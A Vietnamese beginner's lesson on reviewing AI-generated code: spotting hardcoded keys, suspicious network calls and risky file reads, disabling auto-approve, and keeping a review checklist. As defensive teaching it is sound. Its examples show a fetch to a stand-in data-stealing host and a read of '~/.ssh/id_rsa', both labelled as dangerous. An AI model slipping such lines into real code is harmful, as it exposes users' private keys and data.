# 5.3.6 Luôn rà soát code: Thói quen an toàn quan trọng nhất

Qua bài học này, bạn sẽ hiểu:

- Tại sao rà soát code lại quan trọng đến thế
- Cách rà soát code mà bạn không hoàn toàn hiểu
- Lời khuyên về "chế độ tự động phê duyệt" (auto-approve)
- Xây dựng thói quen rà soát bền vững

## Số liệu đáng lo ngại

Theo khảo sát lập trình viên năm 2025:

- Chỉ **67%** lập trình viên rà soát code trước khi triển khai
- Hơn **40%** người mới thừa nhận đã triển khai code do AI tạo ra mà không hoàn toàn hiểu nó
- **33%** lập trình viên cho biết sẽ sao chép dán trực tiếp code do AI tạo ra

Điều này có nghĩa là: Rất nhiều người đang sử dụng đoạn code mà họ không thực sự hiểu.

## Vibe Coding "thực thụ" là gì?

Simon Willison (Chuyên gia AI nổi tiếng, người đóng góp cốt lõi cho Django) có một quan điểm thú vị về điều này:

> "Nếu AI viết tất cả code, nhưng bạn rà soát, kiểm thử và hiểu nó, thì đó không phải là Vibe Coding — đó là dùng AI làm trợ lý đánh máy."

Nói cách khác:

| Cách làm                                 | Loại hình                 | Rủi ro   |
| ---------------------------------------- | ------------------------- | -------- |
| AI tạo → Rà soát → Kiểm thử → Triển khai | Dùng AI hỗ trợ phát triển | Khá thấp |
| AI tạo → Triển khai ngay                 | Vibe Coding thuần túy     | Khá cao  |

Điều chúng tôi cổ vũ trong hướng dẫn này là **phát triển có ý thức với sự hỗ trợ của AI**: Tận dụng triệt để năng lực của AI, nhưng giữ lại sự phán đoán và rà soát của con người.

## Cách rà soát code mà bạn không hoàn toàn hiểu

Bạn có thể nghĩ: Tôi là người mới, căn bản đọc không hiểu code, rà soát kiểu gì?

Tin tốt là: Bạn không cần hiểu hoàn toàn từng dòng code, vẫn có thể thực hiện rà soát có ý nghĩa.

### Mục kiểm tra 1: Thông tin nhạy cảm

Ngay cả khi không hiểu code, bạn cũng có thể nhận ra các mẫu này:

```javascript
// Tự hỏi: Ở đây có thứ gì trông giống khóa không?
const key = "sk-abc123..."; // Cái này trông giống khóa
const key = process.env.KEY; // Đây là cách đúng
```

### Mục kiểm tra 2: Yêu cầu mạng đáng ngờ

Lưu ý xem code có đang gửi dữ liệu đến địa chỉ lạ mà bạn không biết không:

```javascript
// Tự hỏi: Địa chỉ web này có phải là dịch vụ mình biết không?
fetch("https://api.openai.com/..."); // Bình thường, chính chủ OpenAI
fetch("https://random-site.xyz/steal-data"); // Đáng ngờ
```

### Mục kiểm tra 3: Thao tác file

Chú ý xem code có đang đọc ghi file không, đặc biệt là các đường dẫn nhạy cảm:

```javascript
// Tự hỏi: Tại sao lại đọc những file này?
fs.readFile("~/.ssh/id_rsa"); // Nguy hiểm! Đang đọc khóa riêng SSH
fs.readFile("./data.json"); // Bình thường, đọc dữ liệu trong dự án
```

### Mục kiểm tra 4: Nhờ AI giúp bạn rà soát

Bạn có thể nhờ một AI khác (hoặc chính AI đó) kiểm tra code:

```
Vui lòng rà soát đoạn code sau, kiểm tra xem có:
1. Khóa hoặc mật khẩu bị hardcode
2. Yêu cầu mạng đáng ngờ
3. Thao tác file không an toàn
4. Các mối nguy an toàn khác

[Dán code vào đây]
```

::: tip Mẹo
Dùng một AI để rà soát code của một AI khác, có thể phát hiện một số vấn đề rõ ràng. Nhưng điều này không thể thay thế phán đoán của chính bạn.
:::

## Tắt chế độ tự động phê duyệt

Một số AI IDE cung cấp "tự động phê duyệt" hoặc "chế độ Yolo", cho phép AI thực thi lệnh hoặc sửa file mà không cần bạn xác nhận.

**Người mới bắt đầu nên tắt tính năng này.**

Lý do:

1. Bạn cần nhìn thấy AI đang làm gì để học hỏi
2. AI có thể thực hiện những thay đổi bạn không mong muốn
3. Nếu xảy ra lỗi, bạn không thể ngăn chặn kịp thời

Xác nhận thủ công từng thao tác tuy chậm một chút, nhưng an toàn hơn, cũng giúp bạn hiểu chuyện gì đang xảy ra.

## Xây dựng thói quen rà soát bền vững

Rà soát code không tốn nhiều thời gian. Hãy xây dựng các thói quen sau:

**Mỗi khi AI tạo code xong**:

- [ ] Lướt nhanh qua, xem có chuỗi ký tự trông giống khóa không
- [ ] Nếu có yêu cầu mạng, xác nhận địa chỉ đích là cái bạn biết
- [ ] Nếu không hiểu đoạn code nào đó đang làm gì, hỏi AI giải thích

**Mỗi khi chuẩn bị commit/triển khai**:

- [ ] Chạy danh sách kiểm tra an toàn (bài 5.3.4)
- [ ] Xác nhận file .env không bị bao gồm vào

**Ôn tập định kỳ**:

- [ ] Kiểm tra các phụ thuộc dự án có cần cập nhật không
- [ ] Xác nhận không có cảnh báo an toàn mới

## Ghi nhớ nguyên tắc này

::: warning Nguyên tắc cốt lõi
**Code do AI tạo ra, trách nhiệm cuối cùng thuộc về bạn.**

Điều này không phải để dọa bạn, mà là nhắc nhở bạn: Duy trì thói quen rà soát là cách tốt nhất để bảo vệ chính mình.
:::
